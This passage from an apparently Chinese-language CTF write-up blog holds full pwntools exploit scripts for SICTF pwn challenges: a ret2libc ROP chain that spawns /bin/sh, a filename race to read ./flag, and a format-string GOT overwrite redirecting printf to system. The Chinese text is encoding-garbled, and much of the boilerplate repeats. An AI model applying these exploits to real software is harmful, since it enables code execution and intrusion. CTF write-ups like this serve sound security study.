\u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;æ— æ³•è½¬æ¢{value}æˆ–ä¸å­˜åœ¨ç±»å‹{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True,\\ is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;Ã·\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... offset: int = 0x18 + 4 backdoor = m_elf.sym[\u0026#39;win\u0026#39;] payload = flat({offset:[ backdoor ]}) sendline_after_clean(payload) sendline_after_clean(f\u0026#34;%{times}$x\u0026#34;) recved = p.recvuntil(b\u0026#34;\\n\u0026#34;, True) if len(recved) % 2 != 0: recved = b\u0026#34;0\u0026#34; + recved todo.append(recved.decode(\u0026#34;UTF-8\u0026#34;)) p.close() for i in range(10, 22): pwn(i) print(todo) s = \u0026#34;\u0026#34; for ele in todo: tmp = \u0026#34;\u0026#34; for i in range(0, len(ele), 2): tmp = chr(int(ele[i:i+2], 16)) + tmp s += tmp print(s) easystack checksecæŸ¥çœ‹ç¨‹åºæ¶æ„ idaæŸ¥çœ‹ä¼ªCä»£ç  ç¨‹åºçš„æ•´ä½“é€»è¾‘å°±æ˜¯å…ˆè¾“å…¥ä¸€ä¸ªè¾¾ä¸åˆ°æ ˆæº¢å‡ºé•¿åº¦çš„å­—ç¬¦ä¸²ï¼Œç„¶åæŠŠè¿™ä¸ªå­—ç¬¦ä¸²å¤åˆ¶åˆ°æ›´ä½ä½çš„æ ˆä¸Šï¼Œä½†æ˜¯é‡åˆ°\\x00å°±åœæ­¢å¤åˆ¶\nè¿™å°±æ„å‘³ç€ï¼Œæˆ‘ä»¬åœ¨checkçš„æ ˆä¸Šåªèƒ½æº¢å‡ºä¸€å¥åˆ°retä¸Šï¼Œä½†åœ¨è¿™ä¸ªç¨‹åºä¸Šæ˜¾ç„¶ä¸èƒ½ç›´æ¥getshell\näºæ˜¯æˆ‘å°±æƒ³ï¼Œæ—¢ç„¶checkçš„æ ˆæ›´ä½ï¼Œé‚£èƒ½ä¸èƒ½å’Œmainå‡½æ•°ä¸­çš„è¾“å…¥åˆ°æ ˆä¸­çš„payloadè¿åœ¨ä¸€èµ·å‘¢ï¼Ÿ\nä½†ä¸€ä¸ªretè‚¯å®šæ˜¯ä¸è¡Œçš„ï¼Œä½†æ˜¯åˆ«å¿˜äº†ï¼Œèƒ½æ”¹å˜æ ˆæŒ‡é’ˆçš„è¿˜æœ‰popå’Œpushï¼Œ\nå¦‚æœæˆ‘ä»¬ä½¿ç”¨è¿™ä¸ªpopæ‰5ä¸ªçš„gadgetï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¸ä»…èƒ½å’Œæˆ‘ä»¬çš„payloadæ¥ä¸Šï¼Œè€Œä¸”è¿˜ä¼šè·³è¿‡payloadä¸­çš„pop_5_retï¼š\né‚£ä¹ˆï¼Œå…¶å®æˆ‘ä»¬å·²ç»å¯ä»¥å¿½è§†checkå‡½æ•°äº†ï¼Œåªéœ€è¦å°†payloadæ„é€ æˆè¿™æ ·ï¼Œ[content]éƒ¨åˆ†å°±èƒ½å¤Ÿè¢«æ‰§è¡Œ\nflat({offset:[ pop_5_ret, [content] ]}) å› æ­¤é¢˜ç›®å°±è¢«è½¬åŒ–æˆå¸¸è§„çš„ret2libcäº†\nexp # è‡ªåŠ¨ç”Ÿæˆå¤´éƒ¨ from pwn import * from pwn import p64, p32, u32, u64, p8, p16 from LibcSearcher import LibcSearcher import ctypes rmt: bool = False fn: str = \u0026#34;./sictf-easystack\u0026#34; libc_name: str = \u0026#34;./libc.so.6\u0026#34; port: str = \u0026#34;\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if rmt: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; b* 0x40075D c \u0026#34;\u0026#34;\u0026#34;, env=env) else: p = process(fn, env=env) # ä¸¤ä¸ªelfï¼Œæ³¨æ„libcçš„ç‰ˆæœ¬ m_elf = ELF(fn) libc = ELF(libc_name) def suclog(*args, **kwargs): # argsæ˜¯å˜é‡åï¼Œæ˜¯å­—ç¬¦ä¸² for k in args: v = globals()[k] if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): if until is not None: p.recvuntil(flat(until)) else: received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received}\u0026#34;) p.send(flat(content)) def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout:int = 0.05, no_show: bool = True): received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;æ— æ³•è½¬æ¢{value}æˆ–ä¸å­˜åœ¨ç±»å‹{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True,\\ is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;Ã·\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... # æŸ¥æ‰¾gadgetçš„å†…ç½®å‡½æ•° rop_gadget = ROP(m_elf) pop_rdi_ret: int = rop_gadget.find_gadget([\u0026#34;pop rdi\u0026#34;, \u0026#34;ret\u0026#34;])[0] ret: int = rop_gadget.find_gadget([\u0026#34;ret\u0026#34;])[0] pop_5_ret = 0x000000000040089b suclog( \u0026#34;pop_5_ret\u0026#34;, pop_rdi_ret=pop_rdi_ret, ret=ret, ) #éœ€è¦è‡ªè¡Œè®¾å®šoffset offset:int = 0x10 # éœ€è¦æ”¹ä¸ºéœ€è¦çš„è¾“å…¥å‡½æ•°ï¼Œé»˜è®¤ä¸ºputs puts_plt: int = m_elf.plt[\u0026#34;puts\u0026#34;] puts_got: int = m_elf.got[\u0026#34;puts\u0026#34;] main_addr: int = m_elf.sym[\u0026#34;main\u0026#34;] suclog( puts_plt=puts_plt, puts_got=puts_got, main_addr=main_addr ) sendline_after_clean(b\u0026#34;512\u0026#34;) # å‘é€payload payload = flat({offset:[ pop_5_ret, pop_rdi_ret, puts_got, puts_plt, main_addr ]}) sendline_after_clean(payload) p.recvuntil(b\u0026#34;welcome to sictf\\n\u0026#34;) # å¾—åˆ°çœŸå®åœ°å€ puts_addr:int = recv_and_transform() # è®¡ç®—å¾—åˆ°åŸºå€å’Œsystemåœ°å€ base_addr: int = puts_addr - libc.sym[\u0026#39;puts\u0026#39;] system_addr: int = base_addr + libc.sym[\u0026#39;system\u0026#39;] bin_sh_addr: int = base_addr + next(libc.search(b\u0026#34;/bin/sh\u0026#34;)) suclog( puts_addr=puts_addr, base_addr=base_addr, system_addr=system_addr, bin_sh_addr=bin_sh_addr ) # å‘é€payload sendline_after_clean(b\u0026#34;512\u0026#34;) # æ³¨æ„æ ˆå¯¹é½ payload = flat({offset:[ pop_5_ret, ret, pop_rdi_ret, bin_sh_addr, system_addr ]}) sendline_after_clean(payload) interactive_after_clean() SiLibrary checksecæŸ¥çœ‹ç¨‹åºæ¶æ„ idaæŸ¥çœ‹ä¼ªCä»£ç  è¿™é“é¢˜æ˜¯C++åç¼–è¯‘ï¼Œå› æ­¤é˜…è¯»å¯èƒ½ä¼šæœ‰ä¸€ç‚¹å›°éš¾\nä½†æ˜¯ä»”ç»†é˜…è¯»ä¸€ä¸‹ä¼šå‘ç°ï¼Œç¨‹åºé€»è¾‘å…¶å®æŒºå®¹æ˜“ç†è§£çš„\nåªè¦å…ˆæŠŠçº¿ç¨‹æŒ‚èµ·ï¼Œå› ä¸ºé‡Œé¢æœ‰ä¸€ä¸ªsleepï¼Œåœ¨è¿™ä¸€ç§’å†…å°†booknameæ”¹ä¸º./flagå°±è¡Œ\nexp # è‡ªåŠ¨ç”Ÿæˆå¤´éƒ¨ from pwn import * from pwn import p64, p32, u32, u64, p8, p16 from LibcSearcher import LibcSearcher import ctypes rmt: bool = False fn: str = \u0026#34;./sictf-SiLibrary\u0026#34; libc_name:str = \u0026#34;/usr/lib/x86_64-linux-gnu/libstdc++.so.6\u0026#34; port: str = \u0026#34;\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if rmt: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; break main c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # ä¸¤ä¸ªelfï¼Œæ³¨æ„libcçš„ç‰ˆæœ¬ m_elf = ELF(fn) libc = ELF(libc_name) def suclog(*args, **kwargs): # argsæ˜¯å˜é‡åï¼Œæ˜¯å­—ç¬¦ä¸² for k in args: v = globals()[k] if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): if until is not None: p.recvuntil(flat(until)) else: received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received}\u0026#34;) p.send(flat(content)) def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout:int = 0.05, no_show: bool = True): received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;æ— æ³•è½¬æ¢{value}æˆ–ä¸å­˜åœ¨ç±»å‹{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True,\\ is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;Ã·\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... sendline_after_clean(\u0026#34;3\u0026#34;) sendline_after_clean(\u0026#34;2\u0026#34;) sendline_after_clean(\u0026#34;1\u0026#34;) sendline_after_clean(\u0026#34;./flag\\x00\u0026#34;) interactive_after_clean() fmt2 checksecæŸ¥çœ‹ç¨‹åºæ¶æ„ idaæŸ¥çœ‹ä¼ªCä»£ç  ä¸€æ¬¡æ ˆä¸Šæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œä¸¤æ¬¡éæ ˆä¸Šæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œè€Œä¸”ç¬¬ä¸€æ¬¡æ ˆä¸Šæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ä¹‹åè¿˜æœ‰ä¸€æ¬¡æœºä¼šæ”¹å˜æ ˆä¸Šå†…å®¹\næœ€ç¦»è°±çš„æ˜¯ï¼Œè™½ç„¶æ²¡æœ‰ç»™libcï¼Œä½†æ˜¯ç¨‹åºä¸­æ˜¯æœ‰systemçš„\næˆ‘ä»¬å¯ä»¥åœ¨ç¬¬ä¸€æ¬¡æ³„éœ²å‡ºpieçš„åŸºå€ï¼Œç„¶åå°†printf_gotã€printf_got+2å®‰æ’åœ¨æ ˆä¸Šï¼Œç„¶åé€šè¿‡æ ¼å¼åŒ–å­—ç¬¦ä¸²å°†printf_gotæ›´æ”¹ä¸ºsystem_plt\nexp # è‡ªåŠ¨ç”Ÿæˆå¤´éƒ¨ from pwn import * from pwn import p64, p32, u32, u64, p8, p16 from LibcSearcher import LibcSearcher import ctypes rmt: bool = False fn: str = \u0026#34;./sictf-fmt\u0026#34; libc_name:str = \u0026#34;/lib/i386-linux-gnu/libc.so.6\u0026#34; port: str = \u0026#34;\u0026#34; if_32: bool = True if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if rmt: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; break main c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # ä¸¤ä¸ªelfï¼Œæ³¨æ„libcçš„ç‰ˆæœ¬ m_elf = ELF(fn) libc = ELF(libc_name) def suclog(*args, **kwargs): # argsæ˜¯å˜é‡åï¼Œæ˜¯å­—ç¬¦ä¸² for k in args: v = globals()[k] if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): if until is not None: p.recvuntil(flat(until)) else: received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received}\u0026#34;) p.send(flat(content)) def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout:int = 0.05, no_show: bool = True): received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;æ— æ³•è½¬æ¢{value}æˆ–ä¸å­˜åœ¨ç±»å‹{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True,\\ is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;Ã·\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... payload = b\u0026#34;%3$p.%1$p.\u0026#34; sendline_after_clean(payload) pie_addr = recv_and_transform(from_bytes=False, bound=b\u0026#34;.\u0026#34;) - 49 - m_elf.sym[\u0026#39;main\u0026#39;] stack_addr = recv_and_transform(from_bytes=False, bound=b\u0026#34;.\u0026#34;) + 96 printf_got = pie_addr + m_elf.got[\u0026#39;printf\u0026#39;] system_plt = pie_addr + m_elf.plt[\u0026#39;system\u0026#39;] suclog( \u0026#34;printf_got\u0026#34;, \u0026#34;system_plt\u0026#34; ) payload = flat([ printf_got, printf_got + 2, ]) sendline_after_clean(payload, \u0026#34;You have one chance to change it\u0026#34;) fmt = \u0026#34;\u0026#34; write1 = system_plt \u0026amp; 0xffff write2 = (system_plt \u0026gt;\u0026gt; (2*8)) \u0026amp; 0xffff write_dict = {write1:7, write2:8} write_list = [write1, write2] write_list.sort() tmp = 0 for ele in write_list: fmt += f\u0026#34;%{ele-tmp}c%{write_dict[ele]}$hn\u0026#34; tmp = ele fmt += \u0026#34;\\x00\u0026#34; sendline_after_clean(fmt, \u0026#34;I hope to get your blessing\u0026#34;) sendline_after_clean(b\u0026#34;/bin/sh\\x00\u0026#34;) print(fmt) interactive_after_clean() ","date":"2023å¹´01æœˆ22æ—¥","permalink":"https://peterliuzhi.top/writeup/sictf-pwn-writeup/","section":"writeup","summary":"Never mistake motion for action. â€” Ernest Hemingway sictf_pwn C@na2y checksecæŸ¥çœ‹ç¨‹åºæ¶æ„ idaæŸ¥çœ‹ä¼ªCä»£ç  æ³•ä¸€ï¼šç›´æ¥ç”¨ropperæˆ–è€…ROPgadgetç”ŸæˆROPé“¾ æœ€ç®€å•çš„æ–¹æ³•ï¼Œä½¿ç”¨ropp","tags":["pwn","æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´","C++pwn","ç›¸é‚»æ ˆäº¤äº’"],"title":"SICTF PWN WriteUp"},{"categories":["tricks"],"contents":" Action is the foundational key to all success. â€” Pablo Picasso\nğŸ’¡å¦‚éœ€ä½¿ç”¨æœ¬æ–‡ä¸­ä»‹ç»çš„å¤§éƒ¨åˆ†å‘½ä»¤ï¼Œè¯·ç¡®ä¿ç³»ç»Ÿå®‰è£…äº†binutilsï¼Œå¦‚æœªå®‰è£…ï¼Œè¯·ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å®‰è£…ï¼šsudo apt-get install binutils\nfile æˆ‘ä»¬å¯¹ä¸€ä¸ªæ–‡ä»¶ä½¿ç”¨è¯¥å‘½ä»¤çœ‹ä¸€ä¸‹ï¼š\nfile login æˆ‘ä»¬èƒ½å¤Ÿçœ‹åˆ°ï¼Œè¿™ä¸ªæ–‡ä»¶æ˜¯ä¸€ä¸ª64ä½çš„ELFæ–‡ä»¶ï¼Œä»–è¿è¡Œåœ¨x86-64å¹³å°ä¸Šï¼Œå¹¶ä¸”ä»–çš„ç¬¦å·è¡¨æ²¡æœ‰è¢«åˆ é™¤ï¼ˆnot 